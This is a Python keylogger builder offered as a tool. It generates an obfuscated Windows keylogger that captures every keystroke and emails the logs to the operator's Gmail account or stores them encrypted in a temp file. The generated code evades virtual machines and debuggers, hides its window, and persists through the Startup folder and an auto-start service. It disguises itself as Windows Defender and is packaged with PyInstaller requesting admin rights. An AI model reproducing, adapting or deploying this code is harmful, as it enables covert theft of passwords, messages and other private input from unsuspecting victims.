import os
import sys
import base64
import getpass
import tempfile
import shutil
import random
import string
import zlib

def main():
    def rn(l=12):
        return ''.join(random.choice(string.ascii_letters) for _ in range(l))

    def oc(c):
        co = zlib.compress(c.encode('utf-8'))
        en = base64.b85encode(co).decode('ascii')
        lc = f'''
import zlib
import base64
import importlib.util

def {rn()}():
    d = "{en}"
    co = base64.b85decode(d.encode('ascii'))
    cd = zlib.decompress(co).decode('utf-8')
    s = importlib.util.spec_from_loader("{rn()}", loader=None)
    m = importlib.util.module_from_spec(s)
    exec(cd, m.__dict__)
    return m

{rn()} = {rn()}()
'''
        return lc

    def build_keylogger():
        use_email = input("Send logs via email? (y/n): ").lower() == 'y'
        
        email_config = ""
        if use_email:
            email = input("Enter Gmail address: ")
            password = getpass.getpass("Enter Gmail app password: ")
            check_password = getpass.getpass("Confirm Gmail app password: ")
            
            if password != check_password:
                print("Passwords do not match. Exiting.")
                return
                
            email_config = f"""
EMAIL_ADDRESS = "{email}"
EMAIL_PASSWORD = "{password}"
"""
        
        log_method = "email" if use_email else "file"
        log_interval = input("Log interval (seconds) [120]: ") or "120"
        stealth_mode = input("Enable stealth mode? (y/n) [y]: ").lower() or "y"
        persist = input("Enable persistence? (y/n) [y]: ").lower() or "y"
        anti_analysis = input("Enable anti-analysis? (y/n) [y]: ").lower() or "y"
        
        keylogger_code = f'''
import os
import sys
import time
import smtplib
import threading
import ctypes
import tempfile
import shutil
import subprocess
import platform
import psutil
import hashlib
from datetime import datetime
{"" if use_email else "# "}from email.mime.text import MIMEText
{"" if use_email else "# "}from email.mime.multipart import MIMEMultipart

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def check_vm():
    vm_indicators = [
        "vbox", "virtual", "vmware", "qemu", "xen", "hyper-v",
        "docker", "container", "kvm", "parallels"
    ]
    try:
        system_info = platform.system().lower() + " " + platform.release().lower()
        for indicator in vm_indicators:
            if indicator in system_info:
                return True
        
        for process in psutil.process_iter(['name']):
            if any(indicator in process.info['name'].lower() for indicator in vm_indicators):
                return True
                
        return False
    except:
        return False

def check_debugger():
    try:
        debugger_present = ctypes.windll.kernel32.IsDebuggerPresent()
        if debugger_present:
            return True
            
        process_list = ["ollydbg", "ida", "wireshark", "procmon", "processhacker"]
        for process in psutil.process_iter(['name']):
            if any(debugger in process.info['name'].lower() for debugger in process_list):
                return True
                
        return False
    except:
        return False

def encrypt_data(data, key):
    from itertools import cycle
    return bytes([a ^ b for a, b in zip(data, cycle(key.encode()))])

def decrypt_data(data, key):
    return encrypt_data(data, key)

def get_system_id():
    try:
        computer_name = os.getenv('COMPUTERNAME', 'UNKNOWN')
        username = os.getenv('USERNAME', 'UNKNOWN')
        return hashlib.sha256(f"{computer_name}{username}".encode()).hexdigest()[:16]
    except:
        return "default_key_1234"

{email_config}
LOG_METHOD = "{log_method}"
LOG_INTERVAL = {log_interval}
STEALTH_MODE = {"True" if stealth_mode == "y" else "False"}
PERSISTENCE = {"True" if persist == "y" else "False"}
ANTI_ANALYSIS = {"True" if anti_analysis == "y" else "False"}

log = ""
start_time = time.time()
system_id = get_system_id()

try:
    from pynput import keyboard
except ImportError:
    sys.exit(0)

def on_press(key):
    global log
    try:
        if hasattr(key, 'char') and key.char is not None:
            log += key.char
        elif key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\\n"
        elif key == keyboard.Key.tab:
            log += "\\t"
        elif key == keyboard.Key.backspace:
            log = log[:-1]
        else:
            log += f"[{str(key).replace('Key.', '')}]"
    except:
        pass

def send_email(subject, body):
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_ADDRESS
        msg['Subject'] = subject
        
        msg.attach(MIMEText(body, 'plain'))
        
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        text = msg.as_string()
        server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, text)
        server.quit()
        return True
    except:
        return False

def save_to_file(data):
    try:
        temp_dir = tempfile.gettempdir()
        encrypted_data = encrypt_data(data.encode(), system_id)
        log_file = os.path.join(temp_dir, "winlog.dat")
        with open(log_file, "ab") as f:
            f.write(encrypted_data)
        return True
    except:
        return False

def read_log_file():
    try:
        temp_dir = tempfile.gettempdir()
        log_file = os.path.join(temp_dir, "winlog.dat")
        if os.path.exists(log_file):
            with open(log_file, "rb") as f:
                encrypted_data = f.read()
            return decrypt_data(encrypted_data, system_id).decode()
        return ""
    except:
        return ""

def clear_log_file():
    try:
        temp_dir = tempfile.gettempdir()
        log_file = os.path.join(temp_dir, "winlog.dat")
        if os.path.exists(log_file):
            os.remove(log_file)
    except:
        pass

def report():
    global log
    if ANTI_ANALYSIS:
        if check_vm() or check_debugger():
            time.sleep(random.randint(300, 600))
            return
    
    if log:
        current_log = log
        log = ""
        
        if LOG_METHOD == "email" and "EMAIL_ADDRESS" in globals():
            computer_name = os.getenv('COMPUTERNAME', 'UNKNOWN')
            username = os.getenv('USERNAME', 'UNKNOWN')
            subject = f"SYS_{computer_name}_{username}_{int(time.time())}"
            if not send_email(subject, current_log):
                save_to_file(current_log)
        else:
            save_to_file(current_log)
    
    threading.Timer(LOG_INTERVAL, report).start()

def add_to_startup():
    try:
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            return
            
        startup_path = os.path.join(os.getenv('APPDATA'), 
                                  'Microsoft', 'Windows', 'Start Menu', 
                                  'Programs', 'Startup')
        if not os.path.exists(startup_path):
            os.makedirs(startup_path)
            
        target_name = "WindowsDefender.exe"
        startup_file = os.path.join(startup_path, target_name)
        
        if not os.path.exists(startup_file):
            shutil.copy2(exe_path, startup_file)
            
            import win32api
            import win32con
            win32api.SetFileAttributes(startup_file, win32con.FILE_ATTRIBUTE_HIDDEN)
            
    except:
        pass

def install_service():
    try:
        if not is_admin():
            return
            
        service_name = "WinDefendService"
        display_name = "Windows Defender Service"
        
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            return
            
        sc_command = f'sc create "{service_name}" binPath= "{exe_path}" DisplayName= "{display_name}" start= auto'
        subprocess.run(sc_command, shell=True, capture_output=True)
        
        subprocess.run(f'sc description "{service_name}" "Helps protect your system from threats"', shell=True, capture_output=True)
        
    except:
        pass

def main():
    if ANTI_ANALYSIS:
        if check_vm() or check_debugger():
            time.sleep(random.randint(10, 30))
            return
    
    if STEALTH_MODE:
        try:
            import win32console
            import win32gui
            window = win32console.GetConsoleWindow()
            win32gui.ShowWindow(window, 0)
        except:
            pass
    
    if PERSISTENCE:
        add_to_startup()
        if is_admin():
            install_service()
    
    time.sleep(30)
    
    existing_logs = read_log_file()
    if existing_logs:
        global log
        log = existing_logs
        clear_log_file()
    
    report()
    
    try:
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except:
        pass

if __name__ == "__main__":
    main()
'''

        oc_code = oc(keylogger_code)
        
        bd = tempfile.mkdtemp()
        sf = os.path.join(bd, f"sys_{rn()}.py")
        
        try:
            with open(sf, 'w', encoding='utf-8') as f:
                f.write(oc_code)
            
            try:
                import PyInstaller.__main__
                PyInstaller.__main__.run([
                    sf,
                    '--onefile',
                    '--console',
                    '--name', f'WindowsDefender_{rn(4)}',
                    '--clean',
                    '--distpath', './',
                    '--hidden-import', 'pynput.keyboard',
                    '--hidden-import', 'pynput.mouse',
                    '--hidden-import', 'psutil',
                    '--hidden-import', 'pywin32',
                    '--uac-admin',
                    '--version-file', 'none'
                ])
                print("Executable created successfully.")
            except:
                lc = f'''
import os
import tempfile
import subprocess
import sys

ec = """{oc_code}"""

with tempfile.NamedTemporaryFile(suffix='.py', delete=False) as f:
    f.write(ec.encode('utf-8'))
    tf = f.name

try:
    subprocess.run([sys.executable, tf])
finally:
    os.unlink(tf)
'''
                
                of = f"System_{rn(6)}.py"
                with open(of, 'w', encoding='utf-8') as f:
                    f.write(lc)
                
                print(f"Created Python loader: {of}")
            
        finally:
            shutil.rmtree(bd, ignore_errors=True)

    build_keylogger()
    
    print("Keylogger Builder finished.")
    input("\nPress Enter to return...")

if __name__ == "__main__":
    main()